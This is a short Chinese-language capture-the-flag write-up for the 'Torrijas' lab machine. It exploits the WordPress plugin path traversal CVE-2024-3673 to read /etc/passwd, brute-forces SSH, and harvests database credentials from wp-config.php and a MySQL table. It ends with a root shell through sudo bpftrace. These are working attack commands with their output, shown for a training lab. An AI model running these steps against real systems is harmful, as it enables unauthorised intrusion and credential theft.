# Torrijas

2025.02.24 https://thehackerslabs.com/torrijas/

[video](https://www.bilibili.com/video/BV1nNPxegEL4/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

80 web 扫描出 http://192.168.5.40/wordpress/ 也是一个 wordpress。wpscan 直接扫描：

```
wpscan --url http://192.168.5.40/wordpress/ -e u,ap,at,tt,cb --plugins-detection mixed
```

发现用户 administrator 和插件 web-directory-free 1.7.2 ，这个插件有 CVE-2024-3673 漏洞，使用这个 exp 进行利用 https://github.com/Nxploited/CVE-2024-3673/blob/main/CVE-2024-3673.py 下载 py 脚本：

```
python3 CVE-2024-3673.py --url http://192.168.5.40/wordpress/ --file ../../../../../etc/passwd

{
"html": "
root:x:0:0:root:/root:/bin/bash
primo:x:1001:1001::/home/primo:/bin/bash
premo:x:1002:1002::/home/premo:/bin/bash",
"hash": "91d75cb01d4a5d829e86bca1858566db",
"map_markers": "",
"map_listings": "",
"hide_show_more_listings_button": 1,
"sql": "",
"params": "",
"base_url": "http://torrija.thl/wordpress"
}
```

读取到了 passwd 文件内容，发现 2 个用户 primo 和 premo 进行系统文件枚举：

```
for i in $(cat /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt); do echo $i; python3 CVE-2024-3673.py --url http://192.168.5.40/wordpress/ --file ../../../../..$1 ;done
```

尝试爆破下 primo 和 premo 的 ssh 登陆密码，爆出 premo 的 ssh 登陆密码 cassandra

登陆后，拿到 user flag:

```
premo@Torrija-TheHackersLabs:~$ cat user.txt
e7d95b3635f4d45c8bdd6bf31ad4673c  -
```

查看 mysql 操作记录，可能才这个表里 primo 有数据：

```
premo@Torrija-TheHackersLabs:~$ cat .mysql_history
_HiStOrY_V2_
show\040databases;
use\040Torrijas;
show\040tables;
select\040*\040from\040primo;
exit;
```

找到了 wordpress 的数据库配置文件：

```
premo@Torrija-TheHackersLabs:/var/www/html/wordpress$ cat wp-config.php

define( 'DB_USER', 'admin' );
define( 'DB_PASSWORD', 'afdvasgvfdsabdgvs6a9vd8sv' );
```

登陆数据库，这里不要使用 admin 登陆，要使用 root 登陆，同时 root 的密码和 admin 是一样的:

```
mysql -u root -pafdvasgvfdsabdgvs6a9vd8sv

MariaDB [Torrijas]> select * from primo;
+----+---------+----------------+
| id | usuario | contraseña     |
+----+---------+----------------+
|  1 | primo   | queazeshurmano |
+----+---------+----------------+
```

得到了 primo 用户的密码 queazeshurmano , 切换到该用户，sudo -l 发现 (root) NOPASSWD: /usr/bin/bpftrace 直接提权到 root：

```
primo@Torrija-TheHackersLabs:~$ sudo bpftrace -c /bin/sh -e 'END {exit()}'
sudo: unable to resolve host Torrija-TheHackersLabs: Fallo temporal en la resolución del nombre
Attaching 1 probe...
# cd /root
# ls
root.txt
# cat root.txt
f3e431cd1129e9879e482fcb2cc151e8  -
```
